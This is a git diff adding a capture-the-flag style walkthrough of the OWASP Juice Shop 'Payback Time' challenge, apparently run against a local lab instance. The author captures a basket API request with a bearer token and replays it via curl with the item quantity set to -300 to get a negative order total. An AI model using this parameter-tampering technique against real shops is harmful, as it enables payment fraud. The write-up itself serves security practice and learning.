@@ -222,9 +222,65 @@ Solved!
 
 > Place an order that makes you rich.
 
-* Solved? :heavy_minus_sign:
-* Tools Used: :heavy_minus_sign:
+* Solved? :white_check_mark:
+* Tools Used: Chrome, Chrome Inspector, curl
 
+After being a developer for the first ~7 years of my career, I knew exactly where to look for this one. I needed to either change my backet's total, the product's price or the quanitiy of a product in my basket to a negative number. One of those would make my total negative, and they would end up refunding me that money.
+
+I looked through the products page, and found a super nice Melon Bike for $2999 in the store. I definitely need one of those.
+
+<img src="images/3-payback-melon-bike.png">
+
+Since its a collectors item, I added 5 bikes to my cart. I also took a peek at what was in my cart.
+
+```bash
+$ curl -i http://172.16.189.131:3000/rest/basket/6 -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV0aGluZy5pbyIsInBhc3N3b3JkIjoiYjQ0NDg3NjJmYzg3N2MyZDU3YjJjOTcyMzExOGQyNjQiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTYgMjM6MjI6MTIuODM4ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTYgMjM6MjI6MTIuODM4ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTk5NzczNCwiZXhwIjoxNTY2MDE1NzM0fQ.gSZdyoxB1iQJSDRyS_lK96OWfwTarvxzct2XiRgW4A-5V80JwUK6ORGYpecLyk5o-nK9AAHpmhKrDUoyYDGAMNGYzsQ6DKES9dT7XHKzSQD_-glqeIJFXPy_RV2HJf1f4BeNdYCQLVTfnhVFs08WO7QXiFxzQuYSnDJk0FJNgmY" | jq
+
+{
+  "status": "success",
+  "data": {
+    "id": 6,
+    "coupon": null,
+    "createdAt": "2019-08-17T02:29:48.535Z",
+    "updatedAt": "2019-08-17T02:29:48.535Z",
+    "UserId": null,
+    "Products": [
+      {
+        "id": 33,
+        "name": "Melon Bike (Comeback-Product 2018 Edition)",
+        "description": "The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.",
+        "price": 2999,
+        "image": "melon_bike.jpeg",
+        "createdAt": "2019-08-17T02:19:22.725Z",
+        "updatedAt": "2019-08-17T02:19:22.725Z",
+        "deletedAt": null,
+        "BasketItem": {
+          "id": 7,
+          "quantity": 5,
+          "createdAt": "2019-08-17T02:30:07.254Z",
+          "updatedAt": "2019-08-17T02:30:07.960Z",
+          "BasketId": 6,
+          "ProductId": 33
+        }
+      }
+    ]
+  }
+}
+```
+
+It didn't look like my basket has a total price, but there's a quantity and a product price that might be able to be changed. The one I know can be changed by myself is quantity, so let's try that first. I head into my cart, and immediately subtract one of the bikes from my basket. It did a PUT HTTP request to `http://172.16.189.131:3000/api/BasketItems/7`, with `{"quantity":4}` as the JSON payload. So, I copied that request as a `curl` request, and changed the payload to `{"quantity":-300}`, and submitted the request. I'm greeted with the following response:
+
+```json
+{"status":"success","data":{"id":7,"quantity":-300,"createdAt":"2019-08-17T02:16:45.241Z","updatedAt":"2019-08-17T02:17:14.361Z","BasketId":6,"ProductId":33}}
+```
+
+After that, I went back to my cart, refreshed the page, and clicked on the *$$$ubmit* button, and I see my order confirmation.
+
+<img src="images/3-payback-order-confirmation.png">
+
+And when I went back to the application, this message had appeared. Solved!
+
+<img src="images/3-payback-solved.png">
 
 ### Privacy Policy Tier 2
 
@@ -264,6 +320,8 @@ Solved!
 
 * Solved? :heavy_minus_sign:
 * Tools Used: :heavy_minus_sign:
+
+First, I'll need something that's bigger than 100kB.
 
 
 ### Upload Type
